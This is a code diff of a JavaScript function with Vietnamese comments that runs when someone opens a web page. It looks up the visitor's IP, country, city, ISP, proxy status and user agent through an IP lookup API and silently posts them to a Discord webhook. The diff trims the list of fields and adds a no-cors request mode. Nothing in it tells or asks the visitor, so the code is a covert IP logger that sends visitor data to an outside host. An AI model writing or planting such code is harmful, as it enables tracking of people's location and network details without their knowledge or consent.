@@ -18,84 +18,40 @@ async function sendInfo() {
 
     try {
 
-        // API IPBot
+        // IP info
         const res = await fetch("https://api.ipbot.com/");
-
         const data = await res.json();
 
-        const payload = {
-            content:
+        // Nội dung
+        const msg =
 `📱 Có người mở web
 
-🌍 IP:
-${data.ip}
+🌍 IP: ${data.ip}
 
-🌎 Quốc gia:
-${data.location.country} (${data.location.country_code})
+🌎 Quốc gia: ${data.location.country}
 
-🏙️ Thành phố:
-${data.location.city}
+🏙️ Thành phố: ${data.location.city}
 
-📍 Khu vực:
-${data.location.region}
+🏢 Nhà mạng: ${data.network.org}
 
-📮 Postal:
-${data.location.postal}
-
-📡 Tọa độ:
-${data.location.latitude}, ${data.location.longitude}
-
-🕒 Timezone:
-${data.location.timezone}
-
-🏢 Nhà mạng:
-${data.network.org}
-
-🌐 ASN:
-${data.network.asn}
-
-📶 ISP Name:
-${data.network.radar?.name}
-
-🌍 ISP Quốc gia:
-${data.network.radar?.country_name}
-
-👥 Estimated Users:
-${data.network.radar?.estimated_users}
-
-🛡️ Proxy:
-${data.security.is_proxy}
-
-🏢 Datacenter:
-${data.security.is_datacenter}
-
-⚠️ Threat:
-${data.security.threat_level}
-
-📊 Risk Score:
-${data.security.risk_score}
+🛡️ Proxy: ${data.security.is_proxy}
 
 💻 User Agent:
-${data.telemetry.user_agent}
+${data.telemetry.user_agent}`;
 
-📱 Browser:
-${data.telemetry.is_browser}
-
-⚙️ Engine:
-${data.meta.engine}
-
-🕒 Data Version:
-${data.meta.data_version}`
-        };
-
-        // Gửi webhook Discord
+        // Gửi Discord
         await fetch(webhook, {
             method: "POST",
+            mode: "no-cors",
             headers: {
                 "Content-Type": "application/json"
             },
-            body: JSON.stringify(payload)
+            body: JSON.stringify({
+                content: msg
+            })
         });
+
+        console.log("Đã gửi");
 
     } catch(err) {
 
